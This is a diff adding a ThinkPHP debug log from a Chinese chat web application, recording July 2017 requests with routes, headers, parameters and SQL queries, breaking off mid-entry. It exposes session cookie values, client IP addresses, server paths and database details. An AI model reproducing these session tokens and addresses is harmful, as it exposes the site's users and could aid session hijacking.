+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001177s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006527s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000936s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:06:19+08:00 ] 0.0.0.0 121.32.33.50 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.083321s][吞吐率：12.00req/s] [内存消耗：3,426.13kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '49',
+  'x-original-url' => '/home/chat/bind.html',
+  'dnt' => '1',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1; CUID=Oa5lm',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa000000011',
+  'client_name' => 'client',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.005282s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006333s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000710s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000558s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:06:50+08:00 ] 0.0.0.0 121.32.33.50 POST /home/chat/send_message.html
+[ info ] eddchat.oumaikeji.com/home/chat/send_message.html [运行时间：0.093051s][吞吐率：10.75req/s] [内存消耗：3,434.45kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'send_message',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '35',
+  'x-original-url' => '/home/chat/send_message.html',
+  'dnt' => '1',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1; CUID=9hGnW',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'self_name' => 'client',
+  'msg' => 'jhjhk',
+  'type' => 'all',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->send_message[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.014050s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006114s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000718s ]
+[ sql ] [ SQL ] SELECT `avatar`,`id` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000548s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_mess` [ RunTime:0.005744s ]
+[ sql ] [ SQL ] INSERT INTO `edd_mess` (`mess_date` , `from_client_id` , `to_client_id` , `content`) VALUES ('1501427210' , 54 , 0 , 'jhjhk') [ RunTime:0.000574s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:07:50+08:00 ] 0.0.0.0 121.32.33.50 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.081786s][吞吐率：12.23req/s] [内存消耗：3,266.70kb] [文件加载：59]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'dnt' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1; CUID=7dnwS',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.005923s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006410s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000727s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:07:51+08:00 ] 0.0.0.0 121.32.33.50 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.164932s][吞吐率：6.06req/s] [内存消耗：3,567.04kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'dnt' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://www.topthink.com/topic/26211.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1; CUID=wELMf',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.009371s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005886s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000695s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000561s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.000737s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000566s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000558s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000536s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000535s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000529s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000528s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000526s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:07:51+08:00 ] 0.0.0.0 121.32.33.50 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.089602s][吞吐率：11.16req/s] [内存消耗：3,426.13kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '49',
+  'x-original-url' => '/home/chat/bind.html',
+  'dnt' => '1',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1; CUID=_CrCX',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa000000012',
+  'client_name' => 'client',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000972s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006014s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000692s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000570s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:09:30+08:00 ] 0.0.0.0 121.32.33.50 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.059146s][吞吐率：16.91req/s] [内存消耗：3,266.88kb] [文件加载：59]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'upgrade-insecure-requests' => '1',
+  'dnt' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://www.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1; CUID=3aBhT',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001611s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006151s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000723s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:09:30+08:00 ] 0.0.0.0 121.32.33.50 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.168361s][吞吐率：5.94req/s] [内存消耗：3,567.29kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'dnt' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://www.oumaikeji.com/',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1; CUID=vZ736',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.013103s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006339s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000715s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000576s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.001247s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000576s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000563s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000537s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000547s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000544s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000541s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000535s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:09:31+08:00 ] 0.0.0.0 121.32.33.50 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.088078s][吞吐率：11.35req/s] [内存消耗：3,426.13kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '49',
+  'x-original-url' => '/home/chat/bind.html',
+  'dnt' => '1',
+  'x-requested-with' => 'XMLHttpRequest',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'PHPSESSID=skroidgf3lvtu49msmfq3iufr1; CUID=VnvnN',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+  'client_id' => '7f0000010fa000000013',
+  'client_name' => 'client',
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->bind[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.010381s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.005966s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000703s ]
+[ sql ] [ SQL ] SELECT `avatar`,`user_login` FROM `edd_users` WHERE  `user_login` = 'client' [ RunTime:0.000551s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:22:25+08:00 ] 0.0.0.0 140.205.204.75 GET /
+[ info ] eddchat.oumaikeji.com/ [运行时间：0.044244s][吞吐率：22.60req/s] [内存消耗：2,493.88kb] [文件加载：53]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)',
+  'host' => 'eddchat.oumaikeji.com',
+  'accept-language' => 'en',
+  'accept-encoding' => 'gzip,deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\home\controller\Login->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Login.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\login\home_page.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2017-07-30T23:31:43+08:00 ] 0.0.0.0 139.205.180.214 GET /home/chat/home_page.html
+[ info ] eddchat.oumaikeji.com/home/chat/home_page.html [运行时间：0.138477s][吞吐率：7.22req/s] [内存消耗：3,574.91kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'home_page',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/home_page.html',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; CUID=Um7Ks',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\home\controller\Chat->home_page[ C:\web\eddchat_wrkb2y\web\app\home\controller\Chat.php ]
+[ info ] [ VIEW ] C:\web\eddchat_wrkb2y\web/app/home\view\chat\home_page.html [ array (
+  0 => 'client_id',
+  1 => 'client_img',
+  2 => 'client_name',
+  3 => 'clients',
+  4 => 'today_mess',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001176s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006135s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000723s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000576s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` [ RunTime:0.000634s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000550s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000555s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000542s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000531s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 56 LIMIT 1 [ RunTime:0.000531s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000529s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000526s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000526s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000525s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000519s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000583s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000555s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000542s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000537s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 54 LIMIT 1 [ RunTime:0.000535s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:31:43+08:00 ] 0.0.0.0 139.205.180.214 GET /home/chat/favicon.png
+[ info ] eddchat.oumaikeji.com/home/chat/favicon.png [运行时间：0.068004s][吞吐率：14.70req/s] [内存消耗：3,454.02kb] [文件加载：63]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'favicon.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => '',
+  'content-length' => '0',
+  'x-original-url' => '/home/chat/favicon.png',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; PHPSESSID=us37334guq2l1gqrqfcuib2ip5; CUID=uSF2j',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'connection' => 'keep-alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006709s ] mysql:dbname=eddchat;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `edd_users` [ RunTime:0.006237s ]
+[ sql ] [ SQL ] SELECT * FROM `edd_users` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000713s ]
+---------------------------------------------------------------
+[ 2017-07-30T23:31:44+08:00 ] 0.0.0.0 139.205.180.214 POST /home/chat/bind.html
+[ info ] eddchat.oumaikeji.com/home/chat/bind.html [运行时间：0.082376s][吞吐率：12.14req/s] [内存消耗：3,425.61kb] [文件加载：62]
+[ info ] [ LANG ] C:\web\eddchat_wrkb2y\web\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'home',
+    1 => 'chat',
+    2 => 'bind',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'content-length' => '48',
+  'x-original-url' => '/home/chat/bind.html',
+  'x-requested-with' => 'XMLHttpRequest',
+  'origin' => 'http://eddchat.oumaikeji.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'referer' => 'http://eddchat.oumaikeji.com/home/chat/home_page.html',
+  'host' => 'eddchat.oumaikeji.com',
+  'cookie' => 'UID=19vLz; PHPSESSID=us37334guq2l1gqrqfcuib2ip5; CUID=RdgEC',
